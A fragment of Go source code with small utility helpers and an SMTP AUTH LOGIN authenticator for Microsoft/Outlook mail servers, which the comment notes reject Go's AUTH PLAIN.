// ─────────────────────────────────────────────────────────────────────────────

func randHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// ─────────────────────────────────────────────────────────────────────────────
// AUTH LOGIN implementation (required by Microsoft / Outlook SMTP)
// Go's smtp.PlainAuth sends AUTH PLAIN which Microsoft rejects with 504 5.7.4
// ─────────────────────────────────────────────────────────────────────────────

type loginAuth struct{ user, pass string }

func newLoginAuth(user, pass string) smtp.Auth { return &loginAuth{user, pass} }

func (a *loginAuth) Start(_ *smtp.ServerInfo) (string, []byte, error) {
	return "LOGIN", nil, nil
}

func (a *loginAuth) Next(fromServer []byte, more bool) ([]byte, error) {
	if !more {
		return nil, nil
	}
	switch strings.ToLower(strings.TrimSpace(string(fromServer))) {
	case "username:":
		return []byte(a.user), nil
	case "password:":
		return []byte(a.pass), nil
	default:
		return nil, fmt.Errorf("unexpected server prompt: %s", fromServer)
	}
}
